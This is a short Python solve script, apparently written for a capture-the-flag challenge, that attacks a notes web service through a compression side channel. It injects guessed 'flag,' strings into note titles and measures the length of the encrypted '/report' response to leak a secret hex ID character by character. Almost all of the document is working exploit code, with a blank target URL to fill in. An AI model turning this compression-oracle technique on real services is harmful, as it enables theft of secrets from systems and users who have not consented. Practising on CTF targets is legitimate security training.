import requests
URL = "" # replace with ctf uri
MY_NOTE_ID = "AAAAAAAAAA" # replace with a node ID that you will need to create at the endpoint "POST /note"
found_id = "" 

for i in range(10): # Guessing a 10-char hex ID
    best_char = None
    for p in range(16):
        results = []
        for char in "0123456789ABCDEF":
            # Using 'flag,' prefix to target the actual secret
            payload = {"title": ("Z"*p) + (f"flag,{found_id}{char}"*50), "content": "a"}
            requests.put(f"{URL}/note/{MY_NOTE_ID}", json=payload)
            size = len(requests.get(f"{URL}/report").json()['encrypted'])
            results.append((size, char))
        results.sort()
        if results[0][0] < results[-1][0]:
            best_char = results[0][1]
            break
    found_id += (best_char if best_char else "?")
    print(f"Pos {i} | Current Flag ID: {found_id}")
